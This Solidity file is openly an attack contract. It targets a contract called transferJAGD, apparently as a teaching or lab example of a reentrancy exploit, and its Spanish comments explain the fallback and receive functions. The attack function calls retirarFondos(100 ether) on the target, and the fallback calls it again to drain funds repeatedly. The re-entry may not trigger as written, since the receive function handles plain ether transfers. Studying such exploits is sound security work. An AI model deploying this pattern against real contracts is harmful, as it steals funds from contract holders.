// SPDX-License-Identifier: MIT
pragma solidity >=0.8.2 <0.9.0;

import "./transferJAGD.sol";

contract transferJAGDattack {
    
    transferJAGD public objetivoAtaque;
    event Received(address sender, uint amount);

    constructor(address _objetivoAtaque) {
        objetivoAtaque = transferJAGD(_objetivoAtaque);
    }

    function atacar() public {
        objetivoAtaque.retirarFondos(100 ether);
    }
 
    /* La función de reserva es una función a la que se llama cuando un contrato recibe un mensaje que no especifica una función a la que 
    llamar o especifica una función a la que llamar que no existe. 
    La función de reserva se define utilizando la palabra clave en Solidity.fallback
    */
    fallback() external payable {
        objetivoAtaque.retirarFondos(100 ether);
    }
    /*La función receive es una función especial en Solidity que se llama cuando un contrato recibe Ether 
    sin ningún dato. Se utiliza para recibir Ether y se ejecuta automáticamente cuando un contrato recibe Ether.*/
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
 }